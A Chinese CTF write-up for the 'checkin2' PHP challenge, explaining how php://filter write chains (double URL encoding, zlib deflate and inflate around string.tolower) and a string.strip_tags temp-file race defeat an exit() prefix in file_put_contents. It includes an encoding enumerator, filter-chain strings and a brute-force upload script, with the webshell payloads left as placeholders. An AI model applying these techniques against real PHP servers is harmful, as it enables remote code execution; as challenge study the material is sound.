# checkin1/2

## 题目简述

题目给出一段 PHP 源码：服务端会在按 `X_REAL_IP` 哈希生成的沙箱目录中处理 `content` 参数，先判断 `$content` 对应文件是否存在并 `require_once`，随后执行 `file_put_contents($content, '<?php exit();'.$content)`。过滤器只拦截 `iconv|UCS|UTF|rot|quoted|base64`，因此核心是围绕 `php://filter` 写文件、过滤器链和 PHP 7.0.33 临时文件行为绕过前缀 `exit()`。原始 checkin 因配置错误可直接读 `/flag`，checkin2 才是该源码绕过题。

## 解题过程

关键源码如下：

```php
<?php
// PHP 7.0.33 Apache/2.4.25
error_reporting(0);
$sandbox = '/var/www/html/' . md5($_SERVER['HTTP_X_REAL_IP']);
@mkdir($sandbox);
@chdir($sandbox);
highlight_file(__FILE__);
if (isset($_GET['content'])) {
    $content = $_GET['content'];
    if (preg_match('/iconv|UCS|UTF|rot|quoted|base64/i', $content)) {
        die('hacker');
    }
    if (file_exists($content)) {
        require_once($content);
    }
    echo $content;
    file_put_contents($content, '<?php exit();' . $content);
}
```

checkin 因题目配置错误可以直接读 `/flag`，checkin2 才需要绕过。

### 二次编码绕过

`file_put_contents` 可以写入 `php://filter` 这类伪协议目标，而过滤器解析时会对部分过滤器参数再做一次 URL decode。服务端又禁用了最直接的 `%25`，所以需要枚举可在二次解码后还原成目标字符的编码组合。

参考文章的关键点是：`php://filter` 的 `write=` 过滤器链会在写入时处理目标内容，部分过滤器名或参数可经二次 URL 解码后生效，因此可以把被黑名单拦截的字符串拆成第一次请求看似无害、过滤器解析时还原的形式。原文链接可作为延伸阅读： [file_put_contents 与过滤器链测试](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)

枚举思路如下，示例中只保留编码机制，不保留可直接执行的 PHP payload：

```php
<?php
$char = 'r';
for ($ascii1 = 0; $ascii1 < 256; $ascii1++) {
    for ($ascii2 = 0; $ascii2 < 256; $ascii2++) {
        $candidate = '%' . $ascii1 . '%' . $ascii2;
        if (urldecode(urldecode($candidate)) == $char) {
            echo $char . ': ' . $candidate . "\n";
        }
    }
}
?>
php://filter/write=string.%7%32ot13|<rot13-encoded-php-payload>|/resource=Cyc1e.php
```

payload 可以放在过滤器位置，也可以放在文件名位置。`php://filter` 遇到不可用规则通常只是报 warning 并跳过，因此可借助这种容错继续执行后续过滤器。

### 过滤器绕过

题目过滤的过滤器为：

```plain
/iconv|UCS|UTF|rot|quoted|base64/
```

仍可使用 `zlib`、`bzip2`、`string` 等过滤器。`php://filter` 支持多个过滤器串联，因此可以用 `zlib.deflate` / `zlib.inflate` 保持整体内容不变，再在中间插入 `string.tolower` 等过滤器改变 `exit` 前缀附近的字节，从而绕过前缀限制。

```plain
php://filter/zlib.deflate|string.tolower|zlib.inflate|?><php-payload-placeholder>/resource=Cyc1e.php
```

也可以反向构造：先用 `zlib.deflate` 生成压缩内容，再让目标端通过单个 `zlib.inflate` 解出预期 PHP 代码。

### 爆破临时文件

PHP 7.0.33 中 `file_put_contents` 配合伪协议还可触发旧版本 `string.strip_tags` 相关崩溃。崩溃时上传内容可能短暂保存在 `/tmp` 临时文件中，再通过 `require_once` 爆破包含临时文件。该方法搜索空间大、对服务压力高，只适合作为备选思路。

```python
import requests
import string

charset = string.digits + string.ascii_letters
base_url = "http://<challenge-host>:80"

def upload_file_to_include(url, file_content):
    files = {"file": ("payload.jpg", file_content, "image/jpeg")}
    requests.post(url, files=files)

def generate_tmp_files():
    file_content = "<php-command-payload-placeholder>"
    phpinfo_url = (
        base_url
        + "/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php"
    )
    length = 6
    times = len(charset) ** (length // 2)
    for i in range(times):
        print("[+] %d / %d" % (i, times))
        upload_file_to_include(phpinfo_url, file_content)
```

## 方法总结

- 核心技巧：利用 `php://filter` 在 `file_put_contents` 写入阶段处理内容，结合二次 URL 解码、未过滤的 `zlib/string` 过滤器或 PHP 7.0.33 `string.strip_tags` 临时文件行为绕过 `exit()` 前缀。
- 识别信号：看到“用户可控文件名 + `file_put_contents` + `require_once` + `php://filter` 未完全禁用”时，应优先检查过滤器链写文件和 wrapper 解析差异。
- 复用要点：外部参考链接只能作为 payload 细节补充，长期 WP 中应保留题目源码、过滤规则、可用过滤器、绕过原理和至少一条可复现 payload 形态；具体 webshell 内容用占位符描述，避免本地安全软件拦截文档。
